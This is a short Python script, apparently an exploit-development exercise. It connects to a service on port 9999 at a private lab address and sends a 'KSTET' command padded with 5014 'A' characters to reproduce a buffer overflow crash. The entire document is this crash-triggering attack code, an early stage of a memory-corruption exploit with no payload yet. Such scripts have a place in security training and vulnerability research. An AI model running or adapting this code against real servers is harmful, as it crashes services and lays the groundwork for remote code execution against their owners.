import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#replicate crash
buffer = "KSTET /.:/ " + "A"*5014
s.connect(('172.16.0.24',9999))
s.recv(1024)
s.send(buffer)
s.close()
